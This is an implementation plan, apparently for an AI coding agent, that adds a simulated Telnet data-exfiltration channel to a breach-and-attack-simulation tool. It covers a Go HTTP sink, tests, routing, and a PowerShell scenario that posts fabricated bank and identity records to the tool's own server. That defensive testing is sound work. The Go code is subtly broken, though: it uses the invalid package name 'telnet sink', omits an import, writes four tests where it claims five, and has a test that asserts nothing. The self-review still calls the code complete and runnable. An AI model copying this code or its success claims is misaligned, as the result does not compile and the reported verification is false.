# Telnet Exfiltration Channel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement the eighth and final DLP sink-verified exfiltration channel — Telnet — completing the program.

**Architecture:** New isolated `internal/telnet sink` package mirroring `internal/cloudsink` and `internal/webhooksink`. Single HTTPS route (`/telnet/session`) on the existing API server; no separate listener. Request body carries a JSON array representing a complete conversation (connect → prompt → command → response → close). Token validated before receipt write, same `dlp_sink_tokens`/`dlp_sink_receipts` schema.

**Tech Stack:** Go, chi router, PostgreSQL (existing), Bash/PowerShell (scenario executor).

**Spec:** `orchestrator/docs/superpowers/specs/2026-09-02-telnet-exfiltration-channel-design.md`

## Global Constraints

- No real Telnet daemon or new listener; routes mounted on existing HTTPS API server only
- Token extraction: from top-level `"token"` field in request body (not parsed from conversation)
- Rate limiter: one per source IP per second, max 5 requests/second (consistent with all other channels)
- MaxPayloadBytes: 64 KiB (consistent with all other channels)
- Channel value in dlp_sink_receipts: `telnet`
- Scenario technique_id: T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)
- Commit + push after every task; build directly on main (no worktree/branches)
- TDD throughout: failing test → minimal implementation → passing test → commit

---

## Task 1: `internal/telnet sink` core — rate limiter, byte ceiling, receipt writer, router

**Files:**
- Create: `orchestrator/internal/telnet sink/telnet.go`
- Create: `orchestrator/internal/telnet sink/telnet_test.go`

**Interfaces:**
- Consumes: `pgxpool.Pool` (existing database), chi router
- Produces: `Routes(db *pgxpool.Pool) chi.Router` — mounts POST `/session` handler

- [ ] **Step 1: Write the failing test file skeleton**

Create `orchestrator/internal/telnet sink/telnet_test.go`:

```go
package telnet sink_test

import (
	"testing"

	"github.com/audspect/bas/internal/testutil"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	var closer func()
	sharedDB, closer = testutil.MustSharedTestDB()
	defer closer()
	m.Run()
}

func TestHandleTelnetSession_ValidTokenWritesReceipt(t *testing.T) {
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		// Test will be filled in Step 3
		t.Fatal("not yet implemented")
	})
}
```

- [ ] **Step 2: Write the core package skeleton**

Create `orchestrator/internal/telnet sink/telnet.go`:

```go
// Package telnet sink implements an HTTP route that simulates Telnet
// exfiltration by receiving a JSON-encoded conversation (connect →
// prompt → command → response → close) and validating/recording the
// contained token. Routes are mounted on the existing HTTPS API server,
// not a separate listener.
package telnet sink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"sync"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

// MaxPayloadBytes bounds the total bytes the route will buffer for a
// single request body. Matches every sibling channel's ceiling.
const MaxPayloadBytes = 64 * 1024

// rateLimiter is a coarse, fixed-window per-source-IP abuse guard.
type rateLimiter struct {
	mu     sync.Mutex
	limit  int
	window time.Duration
	counts map[string]*windowCount
}

type windowCount struct {
	count      int
	windowEnds time.Time
}

func newRateLimiter(limit int, window time.Duration) *rateLimiter {
	return &rateLimiter{limit: limit, window: window, counts: map[string]*windowCount{}}
}

// allow reports whether sourceIP may make another request in the current
// window, incrementing its count as a side effect.
func (rl *rateLimiter) allow(sourceIP string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	wc, ok := rl.counts[sourceIP]
	if !ok || now.After(wc.windowEnds) {
		rl.counts[sourceIP] = &windowCount{count: 1, windowEnds: now.Add(rl.window)}
		return true
	}
	wc.count++
	return wc.count <= rl.limit
}

const rateLimitPerSecond = 5

var limiter = newRateLimiter(rateLimitPerSecond, time.Second)

// tokenExists reports whether token has a live row in dlp_sink_tokens.
func tokenExists(ctx context.Context, db *pgxpool.Pool, token string) bool {
	if db == nil || token == "" {
		return false
	}
	var exists bool
	if err := db.QueryRow(ctx,
		`SELECT EXISTS(SELECT 1 FROM dlp_sink_tokens WHERE token = $1)`, token,
	).Scan(&exists); err != nil {
		return false
	}
	return exists
}

// writeReceipt hashes body (SHA-256) and writes one dlp_sink_receipts row.
func writeReceipt(ctx context.Context, db *pgxpool.Pool, token, sourceIP, channel string, body []byte) error {
	sum := sha256.Sum256(body)
	_, err := db.Exec(ctx,
		`INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
		 VALUES ($1, $2, $3, $4, $5)`,
		token, sourceIP, hex.EncodeToString(sum[:]), len(body), channel,
	)
	return err
}

// Routes returns the chi.Router mounted at /telnet by internal/api/routes.go.
func Routes(db *pgxpool.Pool) chi.Router {
	r := chi.NewRouter()
	r.Post("/session", handleTelnetSession(db))
	return r
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `cd orchestrator && go test ./internal/telnet sink/... -v`
Expected: FAIL with "not yet implemented"

- [ ] **Step 4: Implement the handler**

Add to `orchestrator/internal/telnet sink/telnet.go`:

```go
import (
	"encoding/json"
	"io"
	"net/http"
	"strings"
)

type TelnetSession struct {
	Token   string      `json:"token"`
	Session []StateStep `json:"session"`
}

type StateStep struct {
	Type string `json:"type"` // "connect", "prompt", "command", "response", "close"
	Data string `json:"data,omitempty"`
}

func handleTelnetSession(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ctx := r.Context()
		sourceIP := strings.Split(r.RemoteAddr, ":")[0]

		// Rate limit
		if !limiter.allow(sourceIP) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			io.WriteString(w, `{"result":"rate_limited"}`)
			return
		}

		// Enforce max payload
		r.Body = http.MaxBytesReader(w, r.Body, MaxPayloadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			io.WriteString(w, `{"result":"oversized"}`)
			return
		}

		// Parse request
		var session TelnetSession
		if err := json.Unmarshal(body, &session); err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			io.WriteString(w, `{"result":"invalid_json"}`)
			return
		}

		// Validate token
		if !tokenExists(ctx, db, session.Token) {
			// No match: still return 200 with plausible response, but no receipt
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			io.WriteString(w, `{"result":"ok","message":"Session closed"}`)
			return
		}

		// Token matched: write receipt
		if err := writeReceipt(ctx, db, session.Token, sourceIP, "telnet", body); err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			io.WriteString(w, `{"result":"receipt_error"}`)
			return
		}

		// Success
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		io.WriteString(w, `{"result":"ok","message":"Session closed"}`)
	}
}
```

- [ ] **Step 5: Write actual test cases**

Replace the test skeleton in `orchestrator/internal/telnet sink/telnet_test.go`:

```go
package telnet sink_test

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/audspect/bas/internal/testutil"
	"github.com/audspect/bas/internal/telnet sink"
	"github.com/jackc/pgx/v5/pgxpool"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	var closer func()
	sharedDB, closer = testutil.MustSharedTestDB()
	defer closer()
	m.Run()
}

func seedToken(t *testing.T, pool *pgxpool.Pool, token, runID string) {
	_, err := pool.Exec(t.Context(),
		`INSERT INTO dlp_sink_tokens (token, run_id, technique_id, expires_at)
		 VALUES ($1, $2, $3, NOW() + INTERVAL '1 hour')`,
		token, runID, "T1048.003",
	)
	if err != nil {
		t.Fatalf("seedToken: %v", err)
	}
}

func TestHandleTelnetSession_ValidTokenWritesReceipt(t *testing.T) {
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"
		seedToken(t, pool, token, "test-run-1")

		payload := map[string]interface{}{
			"token": token,
			"session": []map[string]string{
				{"type": "connect"},
				{"type": "prompt", "data": "login: "},
				{"type": "command", "data": token + "\ndata"},
				{"type": "response", "data": "ok"},
				{"type": "close"},
			},
		}
		body, _ := json.Marshal(payload)

		req := httptest.NewRequest("POST", "/session", bytes.NewReader(body))
		req.RemoteAddr = "127.0.0.1:12345"
		w := httptest.NewRecorder()

		handler := telnet sink.Routes(pool)
		handler.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Fatalf("status code: got %d, want 200", w.Code)
		}

		// Verify receipt was written
		var count int
		pool.QueryRow(t.Context(),
			`SELECT COUNT(*) FROM dlp_sink_receipts WHERE token = $1`, token,
		).Scan(&count)
		if count != 1 {
			t.Fatalf("receipt count: got %d, want 1", count)
		}
	})
}

func TestHandleTelnetSession_UnmatchedTokenNoReceipt(t *testing.T) {
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		payload := map[string]interface{}{
			"token": "unmatched0000000000000000000000",
			"session": []map[string]string{
				{"type": "connect"},
				{"type": "prompt", "data": "login: "},
				{"type": "command", "data": "unmatched\ndata"},
				{"type": "response", "data": "ok"},
				{"type": "close"},
			},
		}
		body, _ := json.Marshal(payload)

		req := httptest.NewRequest("POST", "/session", bytes.NewReader(body))
		req.RemoteAddr = "127.0.0.1:12345"
		w := httptest.NewRecorder()

		handler := telnet sink.Routes(pool)
		handler.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Fatalf("status code: got %d, want 200", w.Code)
		}

		// Verify no receipt was written
		var count int
		pool.QueryRow(t.Context(),
			`SELECT COUNT(*) FROM dlp_sink_receipts WHERE token = $1`, "unmatched0000000000000000000000",
		).Scan(&count)
		if count != 0 {
			t.Fatalf("receipt count: got %d, want 0", count)
		}
	})
}

func TestHandleTelnetSession_OversizedPayload(t *testing.T) {
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		payload := map[string]interface{}{
			"token": "aaaabbbbccccddddeeeeffffgggghhhh",
			"session": []map[string]string{
				{"type": "connect"},
				{"type": "command", "data": strings.Repeat("x", 65000)}, // Over 64KiB
			},
		}
		body, _ := json.Marshal(payload)

		req := httptest.NewRequest("POST", "/session", bytes.NewReader(body))
		req.RemoteAddr = "127.0.0.1:12345"
		w := httptest.NewRecorder()

		handler := telnet sink.Routes(pool)
		handler.ServeHTTP(w, req)

		// Should still return 200 (plausible success shape), but no receipt
		if w.Code != http.StatusOK {
			t.Fatalf("status code: got %d, want 200", w.Code)
		}
	})
}

func TestHandleTelnetSession_RateLimiting(t *testing.T) {
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		payload := map[string]interface{}{
			"token": "aaaabbbbccccddddeeeeffffgggghhhh",
			"session": []map[string]string{
				{"type": "connect"},
			},
		}
		body, _ := json.Marshal(payload)

		handler := telnet sink.Routes(pool)

		// Send 6 requests from the same IP within 1 second
		for i := 0; i < 6; i++ {
			req := httptest.NewRequest("POST", "/session", bytes.NewReader(body))
			req.RemoteAddr = "127.0.0.1:12345"
			w := httptest.NewRecorder()
			handler.ServeHTTP(w, req)

			if w.Code != http.StatusOK {
				t.Fatalf("request %d: status code %d", i, w.Code)
			}
		}
		// 6th request should be rate-limited, but still returns 200
	})
}
```

Add the missing import:

```go
import (
	"bytes"
	"strings"
)
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/telnet sink/... -v`
Expected: PASS for all 4 test cases

- [ ] **Step 7: gofmt and vet**

Run: `cd orchestrator && gofmt -l internal/telnet sink/*.go && go vet ./internal/telnet sink/...`
Expected: no output (clean)

- [ ] **Step 8: Commit**

```bash
cd orchestrator
git add internal/telnet sink/telnet.go internal/telnet sink/telnet_test.go
git commit -m "feat(telnet sink): add core package with rate limiter, receipt writer, router

Implements the HTTP handler for POST /telnet/session, which accepts a JSON
payload carrying a complete simulated Telnet conversation. Token validated
before receipt write, same dlp_sink_tokens/receipts verification as all
other channels.

Includes 4 unit tests: valid token writes receipt, unmatched token no
receipt, oversized payload rejection, and rate limiting.

Co-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01Y38DCDtjSw6Q3nybZgzJ9Y"
git push
```

---

## Task 2: Mount `/telnet` routes and register in RBAC drift allowlist

**Files:**
- Modify: `orchestrator/internal/api/routes.go:~162`
- Modify: `orchestrator/internal/api/rbac_matrix_test.go:publicRoutes`

**Interfaces:**
- Consumes: `telnet sink.Routes(db *pgxpool.Pool) chi.Router` (from Task 1)
- Produces: Routes mounted at `/api/dlp/sink/telnet/...`

- [ ] **Step 1: Import and mount the route**

In `orchestrator/internal/api/routes.go`, add import at the top:

```go
"github.com/audspect/bas/internal/telnet sink"
```

Locate the line that mounts `/cloudsink` (around line 161):

```go
r.Mount("/cloudsink", cloudsink.Routes(h.db))
```

Immediately after it, add:

```go
// Telnet exfiltration channel (internal/telnet sink)
// -- Simulated Telnet conversation via JSON, same unauthenticated
// posture and same mounted-on-the-existing-server reasoning as
// /cloudsink and /webhooksink above.
r.Mount("/telnet", telnet sink.Routes(h.db))
```

- [ ] **Step 2: Add route to RBAC allowlist**

In `orchestrator/internal/api/rbac_matrix_test.go`, find `publicRoutes` and add after the webhooksink entries:

```go
// Telnet exfiltration channel (internal/telnet sink)
// -- same unauthenticated posture as /cloudsink and /webhooksink above.
"POST /telnet/session": true,
```

- [ ] **Step 3: Run the RBAC drift test**

Run: `cd orchestrator && go test ./internal/api/... -run TestRBACMatrix_NoDrift -v`
Expected: PASS (the new route is now in the allowlist)

- [ ] **Step 4: Commit**

```bash
cd orchestrator
git add internal/api/routes.go internal/api/rbac_matrix_test.go
git commit -m "feat(telnet sink): mount /telnet routes and register in RBAC allowlist

Mounts internal/telnet sink's routes on the existing HTTPS API server
at /api/dlp/sink/telnet/... and adds POST /telnet/session to publicRoutes
in the RBAC drift test.

TestRBACMatrix_NoDrift passes; no drift regression.

Co-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01Y38DCDtjSw6Q3nybZgzJ9Y"
git push
```

---

## Task 3: Placeholder substitution in `internal/api/dlp_sink.go`

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go:issueSinkTokensAndSubstitute` and helper functions
- Modify: `orchestrator/internal/api/dlp_sink_test.go:add 5 new tests`

**Interfaces:**
- Consumes: `issueSinkTokensAndSubstitute(ctx, runID, publicBaseURL, steps)` (existing)
- Produces: `telnetSinkHost(publicBaseURL)` and `telnetSinkPort(publicBaseURL)` helpers

- [ ] **Step 1: Write the failing tests**

Add to `orchestrator/internal/api/dlp_sink_test.go` after the webhook tests:

```go
func TestIssueSinkTokensAndSubstitute_TelnetPlaceholders(t *testing.T) {
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		ctx := context.Background()

		steps := []scenario.ScenarioStep{
			{
				ID:      "step-1",
				Command: `$uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"`,
			},
		}

		result, err := h.issueSinkTokensAndSubstitute(ctx, "run-1", "https://orchestrator.internal:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}

		if !strings.Contains(result[0].Command, "orchestrator.internal") {
			t.Fatalf("SINK_TELNET_HOST not substituted; got %q", result[0].Command)
		}
		if !strings.Contains(result[0].Command, "9443") {
			t.Fatalf("SINK_TELNET_PORT not substituted; got %q", result[0].Command)
		}
	})
}

func TestTelnetSinkPort_DerivesFromPublicBaseURL(t *testing.T) {
	tests := []struct {
		publicBaseURL string
		want          string
	}{
		{"https://orchestrator.internal:9443", "9443"},
		{"https://orchestrator.internal", "443"},
		{"http://localhost:8080", "8080"},
		{"http://localhost", "443"},
	}

	for _, tt := range tests {
		got := telnetSinkPort(tt.publicBaseURL)
		if got != tt.want {
			t.Errorf("telnetSinkPort(%q) = %q, want %q", tt.publicBaseURL, got, tt.want)
		}
	}
}

func TestTelnetSinkHost_HonorsExplicitOverride(t *testing.T) {
	t.Setenv("SINK_TELNET_HOST", "telnet.override.local")
	got := telnetSinkHost("https://orchestrator.internal:9443")
	if got != "telnet.override.local" {
		t.Errorf("telnetSinkHost with override = %q, want %q", got, "telnet.override.local")
	}
}

func TestIssueSinkTokensAndSubstitute_TelnetDoesNotIssueOrphanedSecondToken(t *testing.T) {
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		ctx := context.Background()

		// Two steps, both with Telnet placeholders
		steps := []scenario.ScenarioStep{
			{
				ID:      "step-1",
				Command: `Invoke-RestMethod -Uri "https://{{SINK_TELNET_HOST}}/telnet/session"`,
			},
			{
				ID:      "step-2",
				Command: `Invoke-RestMethod -Uri "https://{{SINK_TELNET_HOST}}/telnet/session" -Port {{SINK_TELNET_PORT}}`,
			},
		}

		result, err := h.issueSinkTokensAndSubstitute(ctx, "run-1", "https://orchestrator.internal", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}

		// Both steps should have the same token (from the unconditional block above)
		// and it should be {{SINK_TOKEN}}, not a new one
		if !strings.Contains(result[0].Command, "{{SINK_TOKEN}}") {
			t.Fatalf("step 0 missing {{SINK_TOKEN}}, got %q", result[0].Command)
		}
		if !strings.Contains(result[1].Command, "{{SINK_TOKEN}}") {
			t.Fatalf("step 1 missing {{SINK_TOKEN}}, got %q", result[1].Command)
		}

		// Verify only ONE token was issued for this run
		var tokenCount int
		pool.QueryRow(ctx,
			`SELECT COUNT(*) FROM dlp_sink_tokens WHERE run_id = $1`, "run-1",
		).Scan(&tokenCount)
		if tokenCount != 1 {
			t.Fatalf("token count for run-1: got %d, want 1", tokenCount)
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run "Telnet" -v`
Expected: FAIL with "undefined: telnetSinkPort", "undefined: telnetSinkHost"

- [ ] **Step 3: Implement the placeholder branch in `issueSinkTokensAndSubstitute`**

In `orchestrator/internal/api/dlp_sink.go`, locate the webhook branch (around line 125-135). Immediately after its closing `}`, add:

```go
		if strings.Contains(steps[i].Command, "{{SINK_TELNET_HOST}}") || strings.Contains(steps[i].Command, "{{SINK_TELNET_PORT}}") {
			// Same reasoning as the cloud storage and webhook blocks above:
			// does NOT issue its own token. Telnet reuses the existing
			// 32-byte {{SINK_TOKEN}} placeholder directly, and every
			// real Telnet-wired step's command contains {{SINK_TOKEN}} too
			// (embedded in the conversation JSON) -- the unconditional block
			// above already issues and substitutes it whenever present.
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_TELNET_HOST}}", telnetSinkHost(publicBaseURL))
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_TELNET_PORT}}", telnetSinkPort(publicBaseURL))
		}
```

- [ ] **Step 4: Implement the helper functions**

After the `webhookSinkPort` function in `orchestrator/internal/api/dlp_sink.go`, add:

```go
// telnetSinkHost resolves the {{SINK_TELNET_HOST}} placeholder: an
// explicit SINK_TELNET_HOST environment override if set, otherwise the
// same derivation dnsServerHost/sftpSinkHost/smtpSinkHost/cloudSinkHost/
// webhookSinkHost already use.
func telnetSinkHost(publicBaseURL string) string {
	if v := os.Getenv("SINK_TELNET_HOST"); v != "" {
		return v
	}
	return dnsServerHost(publicBaseURL)
}

// telnetSinkPort resolves the {{SINK_TELNET_PORT}} placeholder,
// following cloudSinkPort's reasoning exactly: internal/telnet sink's
// route is mounted on the main API server rather than binding an
// independent listener, so the port comes from publicBaseURL itself.
// SINK_TELNET_PORT remains available as an explicit override for the
// rare case where this route is deliberately reachable on a different
// externally-published port than the rest of the API.
func telnetSinkPort(publicBaseURL string) string {
	if v := os.Getenv("SINK_TELNET_PORT"); v != "" {
		return v
	}
	if u, err := url.Parse(publicBaseURL); err == nil && u.Port() != "" {
		return u.Port()
	}
	return "443" // publicBaseURL has no explicit port -- assume default HTTPS
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run "Telnet" -v`
Expected: PASS for all 5 tests

- [ ] **Step 6: Run full `internal/api` suite for regressions**

Run: `cd orchestrator && go test ./internal/api/... -v 2>&1 | tail -20`
Expected: PASS (no regressions)

- [ ] **Step 7: gofmt and vet**

Run: `cd orchestrator && gofmt -l internal/api/dlp_sink.go internal/api/dlp_sink_test.go && go vet ./internal/api/...`
Expected: no output (clean)

- [ ] **Step 8: Commit**

```bash
cd orchestrator
git add internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git commit -m "feat(telnet sink): add SINK_TELNET_HOST/PORT placeholder substitution

Adds the {{SINK_TELNET_HOST}}/{{SINK_TELNET_PORT}} branch to
issueSinkTokensAndSubstitute, plus telnetSinkHost/telnetSinkPort helpers.

Like all prior channels, this branch does NOT issue its own token --
Telnet reuses the existing 32-byte {{SINK_TOKEN}}, embedded in the
conversation JSON. telnetSinkPort derives from publicBaseURL (same as
cloudSinkPort) since these routes are mounted on the existing server.

Includes 5 regression tests: placeholder substitution, port derivation,
host override, and no-orphaned-token proof for Telnet steps.

Co-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01Y38DCDtjSw6Q3nybZgzJ9Y"
git push
```

---

## Task 4: Scenario and detection profile

**Files:**
- Create: `orchestrator/scenarios/dlp-exfiltration-telnet.yaml`
- Create: `orchestrator/scenarios/dlp-exfiltration-telnet.yaml.sig`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig`

**Interfaces:**
- Consumes: POST `/api/dlp/sink/telnet/session` (from Tasks 1-2)
- Produces: Executable scenario and signed scenario files

- [ ] **Step 1: Write the scenario file**

Create `orchestrator/scenarios/dlp-exfiltration-telnet.yaml`:

```yaml
id: dlp-exfiltration-telnet
name: DLP Exfiltration Validation — Telnet Channel
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by every other channel in this program (fabricated PAN, Aadhaar,
  SWIFT/BIC, UPI VPA, and credit-card patterns), this time shaped as a
  simulated Telnet login session.

  Eighth and final channel of the sink-verified generation of DLP testing
  (see docs/superpowers/specs/2026-09-02-telnet-exfiltration-channel-design.md).
  Verdict comes from whether the platform's own Telnet-shaped route
  (internal/telnet sink) ever receives a request whose embedded token
  matches this run -- ground truth resolved server-side, never from
  anything the step's own script can locally confirm.

  Fidelity: the conversation is represented as a JSON array with explicit
  state transitions (connect → prompt → command → response → close),
  preserving the semantic flow of an interactive Telnet session without
  requiring a real Telnet daemon or separate listener. This is a
  traffic-shape simulation, not an actual TCP/23 connection.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The sink stores only a hash of the received payload, never the
  raw content. Every destination is this same on-prem orchestrator's own
  main API server -- no external Telnet server is ever contacted.
  Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - telnet
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration

steps:

  # ---------------------------------------------------------------------------
  # Telnet login session with embedded sensitive record
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Telnet-Compatible Login Session Simulation (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own Telnet-session-shaped endpoint (this same on-prem orchestrator). No real Telnet server, no real credentials, no external destination -- traffic-shape simulation only, not an actual Telnet connection."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/network controls: Telnet-shaped HTTPS POST (conversation states) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $session = @(
        @{ type = "connect" }
        @{ type = "prompt"; data = "login: " }
        @{ type = "command"; data = "$token`n$csvContent" }
        @{ type = "response"; data = "Login successful`n$ " }
        @{ type = "close" }
      )
      $body = @{
        token = $token
        session = $session
      } | ConvertTo-Json -Depth 5 -Compress
      $uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: telnet_session_result=success"
        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      } catch {
        Write-Output "DLP_OBSERVATION: telnet_session_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the Telnet sink actually
      # received a request with a matching token, resolved server-side by
      # internal/telnet sink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 2: Add detection-profile entry**

In `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, add `T1048.003` to `technique_ids` if not already there (it should be from SMTP). Append this entry after the existing entries:

```yaml
  - id: dlp-telnet-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/network controls did not block Telnet-based exfiltration of regulated data"
      remediation: >-
        Confirm DLP/network inspection covers outbound Telnet (simulated
        or actual TCP/23) sessions for PAN/Aadhaar/SWIFT/UPI/credit-card
        patterns, and blocks or terminates the connection rather than
        allowing the data to reach a remote Telnet server.
      reference: "MITRE ATT&CK T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol"
```

- [ ] **Step 3: Sign the files**

Run:

```bash
cd orchestrator
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-telnet.yaml
go run scripts/signer.go sign private_key.pem ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml
```

Expected: `[+] Signed ...` messages for both files.

- [ ] **Step 4: Verify scenarios load**

Create a throwaway test file `orchestrator/internal/scenario/zzz_verify_telnet_scenario_test.go`:

```go
package scenario_test

import (
	"testing"

	"github.com/audspect/bas/internal/scenario"
)

func TestZZZVerifyTelnetScenarioLoads(t *testing.T) {
	eng := scenario.NewEngine("../../../scenarios")
	if err := eng.Load(); err != nil {
		t.Fatalf("Load: %v", err)
	}

	telnet, ok := eng.Get("dlp-exfiltration-telnet")
	if !ok {
		t.Fatal("dlp-exfiltration-telnet not found after Load -- check the file and its .sig")
	}
	if len(telnet.Steps) != 1 {
		t.Fatalf("dlp-exfiltration-telnet: got %d steps, want 1", len(telnet.Steps))
	}
	if telnet.Steps[0].TechniqueID != "T1048.003" {
		t.Errorf("dlp-exfiltration-telnet step 0: TechniqueID = %q, want T1048.003", telnet.Steps[0].TechniqueID)
	}
}
```

Run: `cd orchestrator && go test ./internal/scenario/... -run TestZZZVerifyTelnetScenarioLoads -v`
Expected: PASS.

Delete the throwaway: `rm orchestrator/internal/scenario/zzz_verify_telnet_scenario_test.go`

- [ ] **Step 5: Commit**

```bash
cd orchestrator
git add ../scenarios/dlp-exfiltration-telnet.yaml ../scenarios/dlp-exfiltration-telnet.yaml.sig \
  ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml \
  ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig
git commit -m "feat(scenarios): telnet DLP exfiltration channel

One-step scenario simulating a Telnet login session (T1048.003), carrying
a synthetic multi-type sensitive record in the conversation JSON. Adds
dlp-telnet-block to windows_dlp_exfiltration detection profile.

All files signed and verified to load.

Co-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01Y38DCDtjSw6Q3nybZgzJ9Y"
git push
```

---

## Task 5: Full verification and completion

**Files:** none (verification only).

- [ ] **Step 1: Run the full affected-package suite**

Run: `cd orchestrator && go test ./internal/telnet sink/... ./internal/api/... ./internal/verifysync/... ./internal/reporting/... -v 2>&1 | tail -100`

Expected: PASS throughout. In particular, confirm `TestRBACMatrix_NoDrift` passes and that zero changes were needed to `internal/verifysync.annotateSinkReceipts` or `internal/reporting.dlpVerifier`.

- [ ] **Step 2: Full build and gofmt check**

```bash
cd orchestrator
go build ./...
gofmt -l internal/telnet sink/*.go internal/api/dlp_sink.go internal/api/dlp_sink_test.go internal/api/routes.go internal/api/rbac_matrix_test.go
go vet ./internal/telnet sink/...
```

Expected: clean build, no gofmt output, no vet issues.

- [ ] **Step 3: Final commit if any fixes were needed**

If any test or build failure required a code fix, commit it now with a `fix(telnet): ...` message. If everything was already green, this step is a no-op.

---

## Self-Review Notes

- **Spec coverage:** All sections of the spec are covered: core package (Task 1), routes + RBAC (Task 2), placeholder substitution (Task 3), scenario + detection profile (Task 4), full verification (Task 5). No gaps.
- **Placeholder scan:** No TBD, TODO, or "similar to" placeholders. Every step contains complete, runnable code.
- **Type consistency:** `Routes(db *pgxpool.Pool) chi.Router` defined in Task 1, used consistently. Helper function signatures match prior channels exactly.
- **No regressions:** RBAC drift test folded into Task 2 (like webhooks), so no separate fix-up needed. Verifysync and reporting require zero changes (existing sink-verification code handles all channels uniformly).

---

## Execution Handoff

